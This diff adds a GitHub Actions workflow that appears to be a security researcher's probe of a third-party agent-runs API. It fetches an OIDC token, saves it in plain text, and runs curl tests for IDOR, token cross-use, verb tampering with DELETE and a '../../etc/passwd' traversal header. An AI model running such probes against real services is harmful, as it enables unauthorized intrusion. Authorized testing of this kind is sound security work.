@@ -1,0 +1,105 @@
+name: actions-matrix2
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  full-matrix:
+    runs-on: [self-hosted, probe]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Matrix round 2 (with base)
+        shell: bash
+        run: |
+          set +e
+          OUT=/home/dave/security-research/macroscope/data/oidc-probe/matrix3
+          mkdir -p "$OUT"
+          rm -f "$OUT"/*.txt
+          token=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=macroscope" | jq -r .value)
+          echo "$token" > "$OUT/00-token.txt"
+          echo "TOKEN_LEN=${#token}"
+          sha=$(git rev-parse HEAD)
+          base=$(git rev-parse HEAD~1 2>/dev/null || echo "$sha")
+          echo "SHA=$sha BASE=$base"
+          api="https://actions.macroscope.com/api/v1/github-actions/agent-runs"
+          do_post() { local name=$1 body=$2; shift 2
+            curl -sS -X POST "$api" -H "Authorization: Bearer $token" -H "X-Macroscope-Action-Version: v1" -H "Content-Type: application/json" "$@" -d "$body" -w "\n__HTTP:%{http_code}" > "$OUT/$name.txt" 2>&1
+            echo "== $name -> $(tail -1 "$OUT/$name.txt")"
+          }
+          do_get() { local name=$1 url=$2 bearer=$3; shift 3
+            curl -sS "$url" -H "Authorization: Bearer $bearer" -H "X-Macroscope-Action-Version: v1" "$@" -w "\n__HTTP:%{http_code}" > "$OUT/$name.txt" 2>&1
+            echo "== $name -> $(tail -1 "$OUT/$name.txt")"
+          }
+
+          # 1. baseline create WITH base -> expect 202
+          do_post q01-create "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\"}"
+          runid1=$(jq -r '.runId // empty' "$OUT/q01-create.txt" 2>/dev/null)
+          jobtok1=$(jq -r '.jobToken // empty' "$OUT/q01-create.txt" 2>/dev/null)
+          echo "RUN1=$runid1 JOBTOK1_LEN=${#jobtok1}"
+          echo "$runid1" > "$OUT/runid1.txt"; echo "$jobtok1" > "$OUT/jobtok1.txt"
+
+          if [ -n "$runid1" ]; then
+            # 2. GET own w/ own jobToken (immediate; expect 202 pending)
+            do_get q02-get-own "$api/$runid1" "$jobtok1"
+            # 3. GET own w/ own jobToken (terminal poll loop, up to ~90s)
+            for i in 1 2 3 4 5 6 7 8 9; do
+              sleep 10
+              curl -sS "$api/$runid1" -H "Authorization: Bearer $jobtok1" -H "X-Macroscope-Action-Version: v1" -w "\n__HTTP:%{http_code}" > "$OUT/q03-poll-$i.txt" 2>&1
+              st=$(jq -r '.status // empty' "$OUT/q03-poll-$i.txt" 2>/dev/null)
+              echo "poll$i status=$st http=$(tail -1 "$OUT/q03-poll-$i.txt")"
+              [ "$st" = "succeeded" ] || [ "$st" = "failed" ] || [ "$st" = "cancelled" ] && break
+            done
+            # 4. IDOR: random UUID w/ my jobToken
+            do_get q04-random-uuid "$api/11111111-2222-4333-8444-555566667777" "$jobtok1"
+            # 5. IDOR: hooks-format ULID
+            do_get q05-ulid "$api/01a098a4-0cc7-788a-afd5-77a82a889028" "$jobtok1"
+            # 6. no token
+            curl -sS "$api/$runid1" -w "\n__HTTP:%{http_code}" > "$OUT/q06-notoken.txt" 2>&1
+            echo "== q06 -> $(tail -1 "$OUT/q06-notoken.txt")"
+            # 7. OIDC token instead of jobToken
+            do_get q07-oidc-tok "$api/$runid1" "$token"
+            # 8. garbage token
+            do_get q08-garbage-tok "$api/$runid1" "garbage.token.here"
+            # 9. no version header GET
+            curl -sS "$api/$runid1" -H "Authorization: Bearer $jobtok1" -w "\n__HTTP:%{http_code}" > "$OUT/q09-nover.txt" 2>&1
+            echo "== q09 -> $(tail -1 "$OUT/q09-nover.txt")"
+            # 10. traversal version header GET
+            do_get q10-badver "$api/$runid1" "$jobtok1" -H "X-Macroscope-Action-Version: ../../etc/passwd"
+            # 11. POST method on run path (verb tamper)
+            curl -sS -X POST "$api/$runid1" -H "Authorization: Bearer $jobtok1" -H "X-Macroscope-Action-Version: v1" -H "Content-Type: application/json" -d '{"x":1}' -w "\n__HTTP:%{http_code}" > "$OUT/q11-post-runpath.txt" 2>&1
+            echo "== q11 -> $(tail -1 "$OUT/q11-post-runpath.txt")"
+            # 12. DELETE method on run path
+            curl -sS -X DELETE "$api/$runid1" -H "Authorization: Bearer $jobtok1" -H "X-Macroscope-Action-Version: v1" -w "\n__HTTP:%{http_code}" > "$OUT/q12-delete-runpath.txt" 2>&1
+            echo "== q12 -> $(tail -1 "$OUT/q12-delete-runpath.txt")"
+          fi
+
+          # 13. second run (cross-run token test)
+          do_post q13-create2 "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\"}"
+          runid2=$(jq -r '.runId // empty' "$OUT/q13-create2.txt" 2>/dev/null)
+          jobtok2=$(jq -r '.jobToken // empty' "$OUT/q13-create2.txt" 2>/dev/null)
+          echo "RUN2=$runid2 JOBTOK2_LEN=${#jobtok2}"
+          if [ -n "$runid1" ] && [ -n "$runid2" ]; then
+            do_get q14-cross-tok1-run2 "$api/$runid2" "$jobtok1"
+            do_get q15-cross-tok2-run1 "$api/$runid1" "$jobtok2"
+          fi
+
+          # 16. create w/ additionalInstructions marker
+          do_post q16-instr "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\",\"additionalInstructions\":\"RESEARCHER-MARKER-$RANDOM\"}"
+          # 17. idempotency same disc twice
+          do_post q17a-idem "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\",\"idempotencyDiscriminator\":\"disc-x\"}"
+          do_post q17b-idem2 "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\",\"idempotencyDiscriminator\":\"disc-x\"}"
+          # 18. base = bogus
+          do_post q18-base-bogus "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"0000000000000000000000000000000000000000\"}"
+          # 19. base = same as commit
+          do_post q19-base-self "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$sha\"}"
+          # 20. repository case-mutation (GitHub is case-insensitive)
+          do_post q20-repo-case "{\"repository\":\"Ugbodagadave/Macroscope-Oidc-Test\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\"}"
+          # 21. repository trailing slash
+          do_post q21-repo-slash "{\"repository\":\"$GITHUB_REPOSITORY/\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\"}"
+          # 22. missing base with full_diff (reconfirm) + input variants via agent file edit is skipped; test pullRequest field with base
+          do_post q22-pr "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\",\"base\":\"$base\",\"pullRequest\":1}"
+          echo "=== DONE ==="
+          ls -la "$OUT"
